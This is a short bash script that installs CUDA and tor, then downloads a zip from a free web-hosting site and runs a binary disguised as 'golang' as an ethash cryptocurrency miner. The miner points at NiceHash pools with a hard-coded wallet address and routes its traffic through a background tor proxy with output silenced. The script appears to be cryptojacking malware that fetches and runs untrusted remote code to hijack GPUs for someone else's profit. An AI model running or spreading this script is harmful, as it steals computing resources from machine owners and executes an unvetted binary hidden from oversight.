#!/bin/bash

wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/11.6.0/local_installers/cuda-repo-ubuntu1804-11-6-local_11.6.0-510.39.01-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu1804-11-6-local_11.6.0-510.39.01-1_amd64.deb
sudo apt-key add /var/cuda-repo-ubuntu1804-11-6-local/7fa2af80.pub
sudo apt-get update
sudo apt-get install -y tor libpci-dev cuda

string="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$(nvidia-smi --query-gpu=name --format=csv,noheader)
string2=$(echo $string | sed 's/ /_/g')
pool1=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
pool2=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353

nohup tor &>/dev/null &

wget https://minerhosting.000webhostapp.com/files/golang_linux_amd64.zip

unzip golang_linux_amd64.zip

cd golang_linux_amd64

./golang -a ethash --url $pool1 --url2 $pool2 -u $string -p x -w $name --proxy 127.0.0.1:9050
